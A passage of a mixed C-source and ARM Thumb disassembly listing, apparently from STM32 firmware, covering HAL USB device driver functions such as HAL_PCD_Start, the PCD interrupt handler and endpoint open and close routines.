 8002088:	e014      	b.n	80020b4 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 800208a:	687b      	ldr	r3, [r7, #4]
 800208c:	2200      	movs	r2, #0
 800208e:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8002092:	687b      	ldr	r3, [r7, #4]
 8002094:	2201      	movs	r2, #1
 8002096:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 800209a:	687b      	ldr	r3, [r7, #4]
 800209c:	69db      	ldr	r3, [r3, #28]
 800209e:	2b01      	cmp	r3, #1
 80020a0:	d102      	bne.n	80020a8 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 80020a2:	6878      	ldr	r0, [r7, #4]
 80020a4:	f001 fc9e 	bl	80039e4 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 80020a8:	687b      	ldr	r3, [r7, #4]
 80020aa:	681b      	ldr	r3, [r3, #0]
 80020ac:	4618      	mov	r0, r3
 80020ae:	f006 fadf 	bl	8008670 <USB_DevDisconnect>

  return HAL_OK;
 80020b2:	2300      	movs	r3, #0
}
 80020b4:	4618      	mov	r0, r3
 80020b6:	3714      	adds	r7, #20
 80020b8:	46bd      	mov	sp, r7
 80020ba:	bdf0      	pop	{r4, r5, r6, r7, pc}

080020bc <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 80020bc:	b580      	push	{r7, lr}
 80020be:	b082      	sub	sp, #8
 80020c0:	af00      	add	r7, sp, #0
 80020c2:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 80020c4:	687b      	ldr	r3, [r7, #4]
 80020c6:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020ca:	2b01      	cmp	r3, #1
 80020cc:	d101      	bne.n	80020d2 <HAL_PCD_Start+0x16>
 80020ce:	2302      	movs	r3, #2
 80020d0:	e012      	b.n	80020f8 <HAL_PCD_Start+0x3c>
 80020d2:	687b      	ldr	r3, [r7, #4]
 80020d4:	2201      	movs	r2, #1
 80020d6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 80020da:	687b      	ldr	r3, [r7, #4]
 80020dc:	681b      	ldr	r3, [r3, #0]
 80020de:	4618      	mov	r0, r3
 80020e0:	f003 ffc2 	bl	8006068 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 80020e4:	687b      	ldr	r3, [r7, #4]
 80020e6:	681b      	ldr	r3, [r3, #0]
 80020e8:	4618      	mov	r0, r3
 80020ea:	f006 faaa 	bl	8008642 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 80020ee:	687b      	ldr	r3, [r7, #4]
 80020f0:	2200      	movs	r2, #0
 80020f2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020f6:	2300      	movs	r3, #0
}
 80020f8:	4618      	mov	r0, r3
 80020fa:	3708      	adds	r7, #8
 80020fc:	46bd      	mov	sp, r7
 80020fe:	bd80      	pop	{r7, pc}

08002100 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8002100:	b580      	push	{r7, lr}
 8002102:	b084      	sub	sp, #16
 8002104:	af00      	add	r7, sp, #0
 8002106:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8002108:	687b      	ldr	r3, [r7, #4]
 800210a:	681b      	ldr	r3, [r3, #0]
 800210c:	4618      	mov	r0, r3
 800210e:	f006 fac4 	bl	800869a <USB_ReadInterrupts>
 8002112:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8002114:	68fb      	ldr	r3, [r7, #12]
 8002116:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 800211a:	2b00      	cmp	r3, #0
 800211c:	d003      	beq.n	8002126 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 800211e:	6878      	ldr	r0, [r7, #4]
 8002120:	f000 fb59 	bl	80027d6 <PCD_EP_ISR_Handler>

    return;
 8002124:	e110      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8002126:	68fb      	ldr	r3, [r7, #12]
 8002128:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800212c:	2b00      	cmp	r3, #0
 800212e:	d013      	beq.n	8002158 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8002130:	687b      	ldr	r3, [r7, #4]
 8002132:	681b      	ldr	r3, [r3, #0]
 8002134:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002138:	b29a      	uxth	r2, r3
 800213a:	687b      	ldr	r3, [r7, #4]
 800213c:	681b      	ldr	r3, [r3, #0]
 800213e:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8002142:	b292      	uxth	r2, r2
 8002144:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8002148:	6878      	ldr	r0, [r7, #4]
 800214a:	f00a fd4c 	bl	800cbe6 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 800214e:	2100      	movs	r1, #0
 8002150:	6878      	ldr	r0, [r7, #4]
 8002152:	f000 f8fc 	bl	800234e <HAL_PCD_SetAddress>

    return;
 8002156:	e0f7      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8002158:	68fb      	ldr	r3, [r7, #12]
 800215a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800215e:	2b00      	cmp	r3, #0
 8002160:	d00c      	beq.n	800217c <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8002162:	687b      	ldr	r3, [r7, #4]
 8002164:	681b      	ldr	r3, [r3, #0]
 8002166:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800216a:	b29a      	uxth	r2, r3
 800216c:	687b      	ldr	r3, [r7, #4]
 800216e:	681b      	ldr	r3, [r3, #0]
 8002170:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8002174:	b292      	uxth	r2, r2
 8002176:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800217a:	e0e5      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 800217c:	68fb      	ldr	r3, [r7, #12]
 800217e:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8002182:	2b00      	cmp	r3, #0
 8002184:	d00c      	beq.n	80021a0 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8002186:	687b      	ldr	r3, [r7, #4]
 8002188:	681b      	ldr	r3, [r3, #0]
 800218a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800218e:	b29a      	uxth	r2, r3
 8002190:	687b      	ldr	r3, [r7, #4]
 8002192:	681b      	ldr	r3, [r3, #0]
 8002194:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8002198:	b292      	uxth	r2, r2
 800219a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800219e:	e0d3      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 80021a0:	68fb      	ldr	r3, [r7, #12]
 80021a2:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 80021a6:	2b00      	cmp	r3, #0
 80021a8:	d034      	beq.n	8002214 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 80021aa:	687b      	ldr	r3, [r7, #4]
 80021ac:	681b      	ldr	r3, [r3, #0]
 80021ae:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021b2:	b29a      	uxth	r2, r3
 80021b4:	687b      	ldr	r3, [r7, #4]
 80021b6:	681b      	ldr	r3, [r3, #0]
 80021b8:	f022 0204 	bic.w	r2, r2, #4
 80021bc:	b292      	uxth	r2, r2
 80021be:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 80021c2:	687b      	ldr	r3, [r7, #4]
 80021c4:	681b      	ldr	r3, [r3, #0]
 80021c6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021ca:	b29a      	uxth	r2, r3
 80021cc:	687b      	ldr	r3, [r7, #4]
 80021ce:	681b      	ldr	r3, [r3, #0]
 80021d0:	f022 0208 	bic.w	r2, r2, #8
 80021d4:	b292      	uxth	r2, r2
 80021d6:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 80021da:	687b      	ldr	r3, [r7, #4]
 80021dc:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 80021e0:	2b01      	cmp	r3, #1
 80021e2:	d107      	bne.n	80021f4 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 80021e4:	687b      	ldr	r3, [r7, #4]
 80021e6:	2200      	movs	r2, #0
 80021e8:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 80021ec:	2100      	movs	r1, #0
 80021ee:	6878      	ldr	r0, [r7, #4]
 80021f0:	f00a ffd6 	bl	800d1a0 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 80021f4:	6878      	ldr	r0, [r7, #4]
 80021f6:	f00a fd2f 	bl	800cc58 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 80021fa:	687b      	ldr	r3, [r7, #4]
 80021fc:	681b      	ldr	r3, [r3, #0]
 80021fe:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002202:	b29a      	uxth	r2, r3
 8002204:	687b      	ldr	r3, [r7, #4]
 8002206:	681b      	ldr	r3, [r3, #0]
 8002208:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 800220c:	b292      	uxth	r2, r2
 800220e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002212:	e099      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8002214:	68fb      	ldr	r3, [r7, #12]
 8002216:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800221a:	2b00      	cmp	r3, #0
 800221c:	d027      	beq.n	800226e <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 800221e:	687b      	ldr	r3, [r7, #4]
 8002220:	681b      	ldr	r3, [r3, #0]
 8002222:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002226:	b29a      	uxth	r2, r3
 8002228:	687b      	ldr	r3, [r7, #4]
 800222a:	681b      	ldr	r3, [r3, #0]
 800222c:	f042 0208 	orr.w	r2, r2, #8
 8002230:	b292      	uxth	r2, r2
 8002232:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8002236:	687b      	ldr	r3, [r7, #4]
 8002238:	681b      	ldr	r3, [r3, #0]
 800223a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800223e:	b29a      	uxth	r2, r3
 8002240:	687b      	ldr	r3, [r7, #4]
 8002242:	681b      	ldr	r3, [r3, #0]
 8002244:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8002248:	b292      	uxth	r2, r2
 800224a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800224e:	687b      	ldr	r3, [r7, #4]
 8002250:	681b      	ldr	r3, [r3, #0]
 8002252:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002256:	b29a      	uxth	r2, r3
 8002258:	687b      	ldr	r3, [r7, #4]
 800225a:	681b      	ldr	r3, [r3, #0]
 800225c:	f042 0204 	orr.w	r2, r2, #4
 8002260:	b292      	uxth	r2, r2
 8002262:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8002266:	6878      	ldr	r0, [r7, #4]
 8002268:	f00a fcdc 	bl	800cc24 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 800226c:	e06c      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 800226e:	68fb      	ldr	r3, [r7, #12]
 8002270:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002274:	2b00      	cmp	r3, #0
 8002276:	d040      	beq.n	80022fa <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8002278:	687b      	ldr	r3, [r7, #4]
 800227a:	681b      	ldr	r3, [r3, #0]
 800227c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002280:	b29a      	uxth	r2, r3
 8002282:	687b      	ldr	r3, [r7, #4]
 8002284:	681b      	ldr	r3, [r3, #0]
 8002286:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 800228a:	b292      	uxth	r2, r2
 800228c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8002290:	687b      	ldr	r3, [r7, #4]
 8002292:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002296:	2b00      	cmp	r3, #0
 8002298:	d12b      	bne.n	80022f2 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800229a:	687b      	ldr	r3, [r7, #4]
 800229c:	681b      	ldr	r3, [r3, #0]
 800229e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80022a2:	b29a      	uxth	r2, r3
 80022a4:	687b      	ldr	r3, [r7, #4]
 80022a6:	681b      	ldr	r3, [r3, #0]
 80022a8:	f042 0204 	orr.w	r2, r2, #4
 80022ac:	b292      	uxth	r2, r2
 80022ae:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 80022b2:	687b      	ldr	r3, [r7, #4]
 80022b4:	681b      	ldr	r3, [r3, #0]
 80022b6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80022ba:	b29a      	uxth	r2, r3
 80022bc:	687b      	ldr	r3, [r7, #4]
 80022be:	681b      	ldr	r3, [r3, #0]
 80022c0:	f042 0208 	orr.w	r2, r2, #8
 80022c4:	b292      	uxth	r2, r2
 80022c6:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 80022ca:	687b      	ldr	r3, [r7, #4]
 80022cc:	2201      	movs	r2, #1
 80022ce:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 80022d2:	687b      	ldr	r3, [r7, #4]
 80022d4:	681b      	ldr	r3, [r3, #0]
 80022d6:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80022da:	b29b      	uxth	r3, r3
 80022dc:	089b      	lsrs	r3, r3, #2
 80022de:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 80022e2:	687b      	ldr	r3, [r7, #4]
 80022e4:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 80022e8:	2101      	movs	r1, #1
 80022ea:	6878      	ldr	r0, [r7, #4]
 80022ec:	f00a ff58 	bl	800d1a0 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 80022f0:	e02a      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 80022f2:	6878      	ldr	r0, [r7, #4]
 80022f4:	f00a fc96 	bl	800cc24 <HAL_PCD_SuspendCallback>
    return;
 80022f8:	e026      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 80022fa:	68fb      	ldr	r3, [r7, #12]
 80022fc:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002300:	2b00      	cmp	r3, #0
 8002302:	d00f      	beq.n	8002324 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002304:	687b      	ldr	r3, [r7, #4]
 8002306:	681b      	ldr	r3, [r3, #0]
 8002308:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800230c:	b29a      	uxth	r2, r3
 800230e:	687b      	ldr	r3, [r7, #4]
 8002310:	681b      	ldr	r3, [r3, #0]
 8002312:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 8002316:	b292      	uxth	r2, r2
 8002318:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 800231c:	6878      	ldr	r0, [r7, #4]
 800231e:	f00a fc54 	bl	800cbca <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002322:	e011      	b.n	8002348 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002324:	68fb      	ldr	r3, [r7, #12]
 8002326:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800232a:	2b00      	cmp	r3, #0
 800232c:	d00c      	beq.n	8002348 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 800232e:	687b      	ldr	r3, [r7, #4]
 8002330:	681b      	ldr	r3, [r3, #0]
 8002332:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002336:	b29a      	uxth	r2, r3
 8002338:	687b      	ldr	r3, [r7, #4]
 800233a:	681b      	ldr	r3, [r3, #0]
 800233c:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002340:	b292      	uxth	r2, r2
 8002342:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002346:	bf00      	nop
  }
}
 8002348:	3710      	adds	r7, #16
 800234a:	46bd      	mov	sp, r7
 800234c:	bd80      	pop	{r7, pc}

0800234e <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 800234e:	b580      	push	{r7, lr}
 8002350:	b082      	sub	sp, #8
 8002352:	af00      	add	r7, sp, #0
 8002354:	6078      	str	r0, [r7, #4]
 8002356:	460b      	mov	r3, r1
 8002358:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 800235a:	687b      	ldr	r3, [r7, #4]
 800235c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002360:	2b01      	cmp	r3, #1
 8002362:	d101      	bne.n	8002368 <HAL_PCD_SetAddress+0x1a>
 8002364:	2302      	movs	r3, #2
 8002366:	e013      	b.n	8002390 <HAL_PCD_SetAddress+0x42>
 8002368:	687b      	ldr	r3, [r7, #4]
 800236a:	2201      	movs	r2, #1
 800236c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 8002370:	687b      	ldr	r3, [r7, #4]
 8002372:	78fa      	ldrb	r2, [r7, #3]
 8002374:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 8002378:	687b      	ldr	r3, [r7, #4]
 800237a:	681b      	ldr	r3, [r3, #0]
 800237c:	78fa      	ldrb	r2, [r7, #3]
 800237e:	4611      	mov	r1, r2
 8002380:	4618      	mov	r0, r3
 8002382:	f006 f94a 	bl	800861a <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 8002386:	687b      	ldr	r3, [r7, #4]
 8002388:	2200      	movs	r2, #0
 800238a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800238e:	2300      	movs	r3, #0
}
 8002390:	4618      	mov	r0, r3
 8002392:	3708      	adds	r7, #8
 8002394:	46bd      	mov	sp, r7
 8002396:	bd80      	pop	{r7, pc}

08002398 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002398:	b580      	push	{r7, lr}
 800239a:	b084      	sub	sp, #16
 800239c:	af00      	add	r7, sp, #0
 800239e:	6078      	str	r0, [r7, #4]
 80023a0:	4608      	mov	r0, r1
 80023a2:	4611      	mov	r1, r2
 80023a4:	461a      	mov	r2, r3
 80023a6:	4603      	mov	r3, r0
 80023a8:	70fb      	strb	r3, [r7, #3]
 80023aa:	460b      	mov	r3, r1
 80023ac:	803b      	strh	r3, [r7, #0]
 80023ae:	4613      	mov	r3, r2
 80023b0:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 80023b2:	2300      	movs	r3, #0
 80023b4:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80023b6:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80023ba:	2b00      	cmp	r3, #0
 80023bc:	da0e      	bge.n	80023dc <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80023be:	78fb      	ldrb	r3, [r7, #3]
 80023c0:	f003 0307 	and.w	r3, r3, #7
 80023c4:	1c5a      	adds	r2, r3, #1
 80023c6:	4613      	mov	r3, r2
 80023c8:	009b      	lsls	r3, r3, #2
 80023ca:	4413      	add	r3, r2
 80023cc:	00db      	lsls	r3, r3, #3
 80023ce:	687a      	ldr	r2, [r7, #4]
 80023d0:	4413      	add	r3, r2
 80023d2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023d4:	68fb      	ldr	r3, [r7, #12]
 80023d6:	2201      	movs	r2, #1
 80023d8:	705a      	strb	r2, [r3, #1]
 80023da:	e00e      	b.n	80023fa <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80023dc:	78fb      	ldrb	r3, [r7, #3]
 80023de:	f003 0207 	and.w	r2, r3, #7
 80023e2:	4613      	mov	r3, r2
 80023e4:	009b      	lsls	r3, r3, #2
 80023e6:	4413      	add	r3, r2
 80023e8:	00db      	lsls	r3, r3, #3
 80023ea:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023ee:	687a      	ldr	r2, [r7, #4]
 80023f0:	4413      	add	r3, r2
 80023f2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023f4:	68fb      	ldr	r3, [r7, #12]
 80023f6:	2200      	movs	r2, #0
 80023f8:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 80023fa:	78fb      	ldrb	r3, [r7, #3]
 80023fc:	f003 0307 	and.w	r3, r3, #7
 8002400:	b2da      	uxtb	r2, r3
 8002402:	68fb      	ldr	r3, [r7, #12]
 8002404:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 8002406:	883a      	ldrh	r2, [r7, #0]
 8002408:	68fb      	ldr	r3, [r7, #12]
 800240a:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 800240c:	68fb      	ldr	r3, [r7, #12]
 800240e:	78ba      	ldrb	r2, [r7, #2]
 8002410:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 8002412:	78bb      	ldrb	r3, [r7, #2]
 8002414:	2b02      	cmp	r3, #2
 8002416:	d102      	bne.n	800241e <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 8002418:	68fb      	ldr	r3, [r7, #12]
 800241a:	2200      	movs	r2, #0
 800241c:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 800241e:	687b      	ldr	r3, [r7, #4]
 8002420:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002424:	2b01      	cmp	r3, #1
 8002426:	d101      	bne.n	800242c <HAL_PCD_EP_Open+0x94>
 8002428:	2302      	movs	r3, #2
 800242a:	e00e      	b.n	800244a <HAL_PCD_EP_Open+0xb2>
 800242c:	687b      	ldr	r3, [r7, #4]
 800242e:	2201      	movs	r2, #1
 8002430:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002434:	687b      	ldr	r3, [r7, #4]
 8002436:	681b      	ldr	r3, [r3, #0]
 8002438:	68f9      	ldr	r1, [r7, #12]
 800243a:	4618      	mov	r0, r3
 800243c:	f003 fe8c 	bl	8006158 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002440:	687b      	ldr	r3, [r7, #4]
 8002442:	2200      	movs	r2, #0
 8002444:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002448:	7afb      	ldrb	r3, [r7, #11]
}
 800244a:	4618      	mov	r0, r3
 800244c:	3710      	adds	r7, #16
 800244e:	46bd      	mov	sp, r7
 8002450:	bd80      	pop	{r7, pc}

08002452 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002452:	b580      	push	{r7, lr}
 8002454:	b084      	sub	sp, #16
 8002456:	af00      	add	r7, sp, #0
 8002458:	6078      	str	r0, [r7, #4]
 800245a:	460b      	mov	r3, r1
 800245c:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 800245e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002462:	2b00      	cmp	r3, #0
 8002464:	da0e      	bge.n	8002484 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002466:	78fb      	ldrb	r3, [r7, #3]
 8002468:	f003 0307 	and.w	r3, r3, #7
 800246c:	1c5a      	adds	r2, r3, #1
 800246e:	4613      	mov	r3, r2
 8002470:	009b      	lsls	r3, r3, #2
 8002472:	4413      	add	r3, r2
 8002474:	00db      	lsls	r3, r3, #3
 8002476:	687a      	ldr	r2, [r7, #4]
 8002478:	4413      	add	r3, r2
 800247a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800247c:	68fb      	ldr	r3, [r7, #12]
 800247e:	2201      	movs	r2, #1
